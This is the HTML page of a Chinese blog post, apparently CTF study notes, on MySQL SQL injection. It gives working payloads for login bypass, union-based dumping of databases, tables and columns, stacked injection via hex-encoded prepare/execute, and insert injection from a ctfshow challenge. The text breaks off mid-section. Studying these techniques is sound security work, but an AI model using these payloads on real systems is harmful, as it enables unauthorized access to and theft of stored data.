
<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="UTF-8" />
        <title>sql注入 | 雲流のLowest World</title>
        <meta name="author" content="C1oudfL0w0" />
        <meta name="description" content="" />
        <meta name="keywords" content="" />
        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
        <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
        <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<script> const mixins = {}; </script>

<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入jQuery-->
<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<!-- 引入不蒜子-->
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>    
        <script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
    <meta name="generator" content="Hexo 6.3.0"></head>
    <body>
        <!--flag{never_g0nna g1ve_you up}-->

        <!-- 页面点击小红心与文字 -->
        <script type = "text/javascript" src = "/blog/js/love-click.js"></script>

        <!-- 浏览器标题 -->
         <script type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
         
        <!--动态背景-->
        <script type="text/javascript"
        color="0,0,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>

        <!--文章目录-->
        
    <div id="toc" class="toc-article">
    <h3><i class="fa-brands fa-readme"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E8%AF%AD%E6%B3%95"><span class="toc-text">SQL语法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">万能密码绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E4%BD%8D%E7%BD%AE"><span class="toc-text">注入位置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="toc-text">注入手法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">联合查询注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">时间盲注</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-text">堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9"><span class="toc-text">修改</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E5%A4%84%E7%90%86"><span class="toc-text">预处理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqlmap%E4%B8%80%E6%8A%8A%E6%A2%AD"><span class="toc-text">Sqlmap一把梭</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#insert%E6%B3%A8%E5%85%A5"><span class="toc-text">insert注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#update%E6%B3%A8%E5%85%A5"><span class="toc-text">update注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#delete%E6%B3%A8%E5%85%A5"><span class="toc-text">delete注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#updatexml"><span class="toc-text">updatexml</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#extractvalue"><span class="toc-text">extractvalue</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#group-by"><span class="toc-text">group by</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#limit%E6%B3%A8%E5%85%A5"><span class="toc-text">limit注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%95"><span class="toc-text">联合查询法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#procedure-analyse-%E5%87%BD%E6%95%B0"><span class="toc-text">procedure analyse()函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%B3%95"><span class="toc-text">报错注入法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5%E6%B3%95"><span class="toc-text">时间注入法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#group-by%E6%B3%A8%E5%85%A5"><span class="toc-text">group by注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5%E6%B3%95-1"><span class="toc-text">时间注入法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5%E6%B3%95"><span class="toc-text">布尔注入法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%B3%95-1"><span class="toc-text">报错注入法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#finfo%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5"><span class="toc-text">finfo文件注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#finfo%E7%B1%BB"><span class="toc-text">finfo类</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#file%E6%B3%A8%E5%85%A5"><span class="toc-text">file注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#user-ini%E5%92%8C%E7%9F%AD%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87"><span class="toc-text">.user.ini和短标签绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#quine%E6%B3%A8%E5%85%A5"><span class="toc-text">quine注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#UDF%E6%B3%A8%E5%85%A5"><span class="toc-text">UDF注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-text">限制绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%8D%E6%95%B0%E9%95%BF%E5%BA%A6%E4%B8%8D%E8%B6%B3"><span class="toc-text">位数长度不足</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E8%BF%87%E6%BB%A4"><span class="toc-text">输入过滤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-text">防御</span></a></li></ol>
    </div>
  
        
        <!--返回顶部-->
        <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
            <a title="返回顶部">↑</a>
            </div>
        <script src="/blog/js/totop.js"></script>

        <div id="layout">
            <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载可能会花费较长时间，请耐心等待</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
            </transition>
            <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>sql注入</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/3/16
        </span>
        
        <span class="category">
            <a href="/blog/categories/Web/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                Web
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/Sql/" style="color: #03a9f4">Sql</a>
            </span>
            
        </span>
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">5.2k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">22分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114325805">SQL注入</a></h1><p><a target="_blank" rel="noopener" href="http://sqlwiki.radare.cn/#/injectionTypes/errorBased">wiki</a></p>
<p>如无特殊说明，本篇都是基于mysql数据库的注入</p>
<p>原型</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//拼接sql语句查找指定ID用户</span>
$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select username,password from table_name where username !='flag' and id = '"</span><span class="token punctuation">.</span>$_GET<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' limit 1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>PS:此语句中存在<code>limit 1</code>即只回显一行</p>
<p>基本思路</p>
<p>用<code>1&#39;</code>闭合前面的语句，执行自己构造的语句</p>
<span id="more"></span>

<h1 id="SQL语法"><a href="#SQL语法" class="headerlink" title="SQL语法"></a><a href="https://c1oudfl0w0.github.io/blog/2023/05/05/SQL%E8%AF%AD%E6%B3%95/">SQL语法</a></h1><p><strong>表示注释</strong>:</p>
<p>#或%23：post请求中使用</p>
<p>–+或–%20:get请求中使用（+将被识别为空格）</p>
<hr>
<h1 id="万能密码绕过"><a href="#万能密码绕过" class="headerlink" title="万能密码绕过"></a>万能密码绕过</h1><p>原理：使相关语句永真，使整段语句可执行即可，然后会返回所有结果</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">'or 1 = 1#
1'</span><span class="token operator">or</span><span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1
1'</span><span class="token operator">or</span><span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token operator">%</span><span class="token number">23</span>

此时
<span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username <span class="token operator">!=</span><span class="token string">'flag'</span> <span class="token operator">and</span> id <span class="token operator">=</span> <span class="token string">'1'</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token operator">and</span>优先级<span class="token operator">></span><span class="token operator">or</span>
即username <span class="token operator">!=</span><span class="token string">'flag'</span> <span class="token operator">and</span> id <span class="token operator">=</span> <span class="token string">'1'</span> 或 <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>
F <span class="token operator">or</span> T <span class="token operator">=</span> T<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>ffifdyop</code>：md5加密时使用&#x3D;<code>129581926211651571912466741651878684928</code></p>
<hr>
<h1 id="注入位置"><a href="#注入位置" class="headerlink" title="注入位置"></a>注入位置</h1><p>例：登录框</p>
<hr>
<h1 id="注入手法"><a href="#注入手法" class="headerlink" title="注入手法"></a>注入手法</h1><ul>
<li><p>数字型：当输入的参数为整型时，如果存在注入漏洞，可以认为是数字型注入（无引号闭合）</p>
<p><code>1</code></p>
<p>如果想传入字符串的话需要先转换为16进制</p>
</li>
<li><p>字符型：当输入的参数被当做字符串时，称为字符型（有引号闭合）</p>
<p><code>1‘</code>或<code>1“</code></p>
</li>
</ul>
<hr>
<h1 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h1><blockquote>
<p>适用于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化</p>
</blockquote>
<blockquote>
<p>并集查询，可用于前面的语句查不到的情况</p>
</blockquote>
<p>基础语句：</p>
<p>查数据库名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查表名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查列名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'表名'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查字段</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>列名<span class="token punctuation">)</span> <span class="token keyword">from</span> 表名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<p>语句原型</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> column_name<span class="token punctuation">,</span>column_name <span class="token keyword">from</span> table_name <span class="token keyword">where</span> column_name<span class="token operator">=</span><span class="token string">'flag'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li><p>步骤</p>
<p><em>1. 页面观察</em></p>
<p><em>2. 注入点判断</em></p>
<p><em>3. 判断当前表的字段个数</em>：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><em>4. 判断显示位</em>：判断我们的输入会在屏幕哪个地方进行回显</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2,3 --+
//=-1'</span>:<span class="token punctuation">(</span>让前面的参数查不出来<span class="token punctuation">)</span>
<span class="token comment">//1,2,3:(总列数)</span>
<span class="token comment">//--+(注释)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><em>5. 爆数据库名字</em></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">--+</span>
<span class="token comment">//1:(头列数)</span>
<span class="token comment">//3:(尾列数)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><em>6. 爆数据库中的表</em></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()/'</span>数据库名' <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><em>7. 爆表中的字段</em></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,group_concat(column_name),3 from information_schema.columns where (table_schema='</span>数据库名<span class="token string">' and)  table_name='</span>表名' <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><em>8. 爆相应字段的所有数据</em></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,group_concat(字段名,'</span><span class="token comment">--',字段名,'--',字段名),3 from 表名 --+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ul>
<hr>
<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><blockquote>
<p>SQL语句执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试，逐位爆破出我们需要的值，这个过程成为盲注</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_49150931/article/details/111829828">外链</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Kracxi?type=blog">脚本参考Kradress</a></p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><a href="https://c1oudfl0w0.github.io/blog/2023/05/06/SQL%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">布尔盲注</a></h2><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a><a href="https://c1oudfl0w0.github.io/blog/2023/05/10/SQL%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">时间盲注</a></h2><hr>
<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><blockquote>
<p>使用<code>;</code>执行多条sql语句</p>
</blockquote>
<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230728174634319.png" alt="image-20230728174634319"></p>
<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230728174706631.png" alt="image-20230728174706631"></p>
<p><strong>区别</strong>：联合查询注入只能执行<strong>查询语句</strong>，堆叠注入可执行任意语句（增删查改）</p>
<p><a href="https://c1oudfl0w0.github.io/blog/2023/08/15/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E8%AE%BA/">题目实战</a></p>
<h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><p><strong>rename…to…语句</strong>：可以重命名改表名，使表名可被直接查询到</p>
<p><strong>alter</strong>：修改已知表的列。（ 添加：add | 修改：alter，change | 撤销：drop ）</p>
<p><strong>type</strong>：指定字段的类型，如<code>varchar(100)</code>、<code>text</code></p>
<ul>
<li><p>添加：</p>
<p><code>alter table &quot;table_name&quot; add &quot;column_name&quot;  type;</code></p>
</li>
<li><p>删除：</p>
<p><code>alter table &quot;table_name&quot; drop &quot;column_name&quot;  type;</code></p>
</li>
<li><p>改变数据类型：</p>
<p><code>alter table &quot;table_name&quot; alter column &quot;column_name&quot; type;</code></p>
</li>
<li><p>改列名：</p>
<p><code>alter table &quot;table_name&quot; rename &quot;column1&quot; to &quot;column2&quot;;</code></p>
</li>
</ul>
<hr>
<h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/geaozhang/p/9891338.html">参考文章</a></p>
<p>利用字符串定义预处理 SQL （以直角三角形计算为例）</p>
<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230815171341792.png" alt="image-20230815171341792"></p>
<p>那么同样的，我们可以在预处理语句中构造payload来执行select语句</p>
<p>(以select * from `1919810931114514`为例)</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token punctuation">;</span><span class="token keyword">SeT</span><span class="token variable">@a</span><span class="token operator">=</span><span class="token number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span><span class="token punctuation">;</span><span class="token keyword">prepare</span> execsql <span class="token keyword">from</span> <span class="token variable">@a</span><span class="token punctuation">;</span><span class="token keyword">execute</span> execsql<span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>prepare…from…是预处理语句，会进行编码转换</li>
<li>execute用来执行由SQLPrepare创建的SQL语句</li>
<li>SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值</li>
</ul>
<hr>
<h1 id="Sqlmap一把梭"><a href="#Sqlmap一把梭" class="headerlink" title="Sqlmap一把梭"></a>Sqlmap一把梭</h1><blockquote>
<p>自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL进行SQL注入。目前支持的数据库有MySql、Oracle、Access、PostageSQL、SQL Server、IBM DB2、SQLite、Firebird、Sybase和SAP MaxDB等</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/603497242">参考文章</a></p>
<p><a href="https://c1oudfl0w0.github.io/blog/2023/07/28/ctfshow-sqlmap%E5%AE%9E%E6%88%98%E8%AE%BA/">题目实战</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">官方文档</a></p>
<p>提供5种注入方式：</p>
<ol>
<li>基于布尔类型的盲注，即可以根据返回页面判断条件真假的注入</li>
<li>基于时间的盲注，即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已经执行(即页面返回时间是否增加)来判断</li>
<li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中</li>
<li>联合查询注入，在可以使用Union的情况下注入</li>
<li>堆查询注入，可以同时执行多条语句时的注入</li>
</ol>
<p>注意：python3.9以上需要自行搜索更改几个模块的名称才能使用sqlmap（对着报错文件全局找模块，请）</p>
<hr>
<h1 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h1><p>插入从数据库中获取的信息</p>
<p>查询语句原型：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"insert into table_name(column_name1,column_name2) value('&#123;$username&#125;','&#123;$password&#125;');"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>我们的目标是插入信息的同时要能够回显数据库里的内容，为此我们需要用<code>\</code>对<code>&#39;</code>进行转义然后执行其它的语句</p>
<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230814111657385.png" alt="image-20230814111657385"></p>
<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230814111728118.png" alt="image-20230814111728118"></p>
<blockquote>
<p>ctfshow web237</p>
</blockquote>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username<span class="token operator">=</span>hello\<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span>
<span class="token comment"># 查表名</span>
username<span class="token operator">=</span>hello\<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span>
<span class="token comment"># 查字段</span>
username<span class="token operator">=</span>hello\<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span>
<span class="token comment"># 查flag</span>
username<span class="token operator">=</span>hello\<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>flagass23s3<span class="token punctuation">)</span> <span class="token keyword">from</span> flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
